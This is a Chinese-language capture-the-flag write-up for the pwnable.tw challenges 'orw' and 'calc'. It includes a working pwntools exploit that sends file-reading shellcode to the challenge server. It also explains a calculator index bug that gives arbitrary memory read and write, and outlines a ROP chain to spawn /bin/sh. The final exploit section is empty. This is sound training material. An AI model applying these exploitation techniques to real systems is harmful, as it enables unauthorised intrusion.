
## ORW
```
int __cdecl main(int argc, const char **argv, const char **envp)

{

  orw_seccomp();

  printf("Give my your shellcode:");

  read(0, &shellcode, 0xC8u);

  ((void (*)(void))shellcode)();

  return 0;

}
```

### 利用思路
- 先调用`open`函数打开`flag`文件
- 将`flag`文件的内容`read`到栈中
- 再用`write`函数将栈的内容打印出来

### exp
```
# -*- coding: utf-8 -*-

from PwnContext.core import *

local = False



# Set up pwntools for the correct architecture

exe = './' + 'orw'

elf = context.binary = ELF(exe)



#don't forget to change it

host = args.HOST or 'chall.pwnable.tw'

port = int(args.PORT or 10001)



#don't forget to change it

#ctx.binary = './' + 'orw'

ctx.binary = exe

libc = elf.libc

ctx.debug_remote_libc = False

ctx.remote_libc = libc

if local:

    context.log_level = 'debug'

    try:

        io = ctx.start()

    except Exception as e:

        print(e.args)

        print("It can't work,may be it can't load the remote libc!")

        print("It will load the local process")

        io = process(exe)

else:

    io = remote(host,port)

#===========================================================

#                    EXPLOIT GOES HERE

#===========================================================



# Arch:     i386-32-little

# RELRO:    Partial RELRO

# Stack:    Canary found

# NX:       NX disabled

# PIE:      No PIE (0x8048000)

# RWX:      Has RWX segments

def exp():

    #shellcode

    shellcode = shellcraft.open('/home/orw/flag')

    shellcode += shellcraft.read('eax','esp',0x30)

    shellcode += shellcraft.write(1,'esp',0x30)



    io.recv()

    io.send(asm(shellcode))



if __name__ == '__main__':

    exp()

    io.interactive()
```

## 0x02 calc(数组溢出)

### 查看防护
```
[17] % checksec calc
[*] '/home/dylan/desktop/pwnable.tw/calc/calc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE
```

IDA分析一下程序结构,这个程序看着麻烦,实际上关键的代码也就那么点,逻辑不难
```
unsigned int calc()

{

  int ptr; // [esp+18h] [ebp-5A0h]

  int result[100]; // [esp+1Ch] [ebp-59Ch]

  char calc_string; // [esp+1ACh] [ebp-40Ch]

  unsigned int v4; // [esp+5ACh] [ebp-Ch]



  v4 = __readgsdword(0x14u);

  while ( 1 )

  {

    bzero(&calc_string, 0x400u);

    if ( !get_expr((int)&calc_string, 1024) )

      break;

    init_pool(&ptr);

    if ( parse_expr((int)&calc_string, &ptr) )

    {

      printf((const char *)&unk_80BF804, result[ptr - 1]);

      fflush(stdout);

    }

  }

  return __readgsdword(0x14u) ^ v4;

}
```
这是主要函数,先调用`get_expr`函数读取一个字符串,并且过滤除`[0-9]*+-%`之外的字符,`init_pool`初始化一个内存块,然后调用`parse_expr`函数计算结果,结果存放在`result[ptr - 1]`处.
```
signed int __cdecl parse_expr(int calc_string, _DWORD *result)

{

  int len; // ST2C_4

  int v4; // eax

  int v5; // [esp+20h] [ebp-88h]

  int index; // [esp+24h] [ebp-84h]

  int v7; // [esp+28h] [ebp-80h]

  char *malloc_mem; // [esp+30h] [ebp-78h]

  int v9; // [esp+34h] [ebp-74h]

  char s[100]; // [esp+38h] [ebp-70h]

  unsigned int v11; // [esp+9Ch] [ebp-Ch]



  v11 = __readgsdword(0x14u);

  v5 = calc_string;

  v7 = 0;

  bzero(s, 0x64u);

  for ( index = 0; ; ++index )

  {

    if ( (unsigned int)(*(char *)(index + calc_string) - 48) > 9 )

    {

      len = index + calc_string - v5;

      malloc_mem = (char *)malloc(len + 1);

      memcpy(malloc_mem, v5, len);

      malloc_mem[len] = 0;

      if ( !strcmp(malloc_mem, "0") )

      {

        puts("prevent division by zero");

        fflush(stdout);

        return 0;

      }

      v9 = atoi(malloc_mem);

      if ( v9 > 0 )

      {

        v4 = (*result)++;

        result[v4 + 1] = v9;

      }

      if ( *(_BYTE *)(index + calc_string) && (unsigned int)(*(char *)(index + 1 + calc_string) - 48) > 9 )

      {

        puts("expression error!");

        fflush(stdout);

        return 0;

      }

      v5 = index + 1 + calc_string;

      if ( s[v7] )

      {

        switch ( *(char *)(index + calc_string) )

        {

          case '%':

          case '*':

          case '/':

            if ( s[v7] != 43 && s[v7] != 45 )

            {

              eval(result, s[v7]);

              s[v7] = *(_BYTE *)(index + calc_string);

            }

            else

            {

              s[++v7] = *(_BYTE *)(index + calc_string);

            }

            break;

          case '+':

          case '-':

            eval(result, s[v7]);

            s[v7] = *(_BYTE *)(index + calc_string);

            break;

          default:

            eval(result, s[v7--]);

            break;

        }

      }

      else

      {

        s[v7] = *(_BYTE *)(index + calc_string);

      }

      if ( !*(_BYTE *)(index + calc_string) )

        break;

    }

  }

  while ( v7 >= 0 )

    eval(result, s[v7--]);

  return 1;

}
```
`result`数组保存操作数,`s`数组保存运算符号,`result[0]`保存操作数的个数.
```
_DWORD *__cdecl eval(_DWORD *result, char a2)

{

  _DWORD *a3; // eax



  if ( a2 == '+' )

  {

    result[*result - 1] += result[*result];

  }

  else if ( a2 > '+' )

  {

    if ( a2 == '-' )

    {

      result[*result - 1] -= result[*result];

    }

    else if ( a2 == '/' )

    {

      result[*result - 1] /= result[*result];

    }

  }

  else if ( a2 == '*' )

  {

    result[*result - 1] *= result[*result];

  }

  a3 = result;

  --*result;

  return a3;

}
```
漏洞就发生在`eval`函数里边,程序并没有对`result[0]`进行检查,所以如果我们控制了`result[0]`的值,就可以进行任意地址读写了.假如+20因为第一个字符为符号+而只有一个数字，那么在这样的情况下执行`eval`函数时，`result[*result - 1] += result[*result]`就会变成`result[1-1] += result[1]`,于是就成功控制了`result[0]`的值。

### 利用方法
- 利用任意地址读写控制`eip`.`esp`的偏移`0x5A0`=1440,所以返回地址的偏移为1444/4=361.这就意味着我们输入`+361`的时候显示的就是返回地址的值,接着构造`ROP`链.
- 关于`ROP`链的构造,你可以直接构造系统调用执行`execve('/bin/sh')`,也可以执行`_dl_make_stack_executable`将`NX`给关了.因为是静态链接,所以使用工具更加方便,这里我直接调用`ROPgadget`自动构造了

### exp
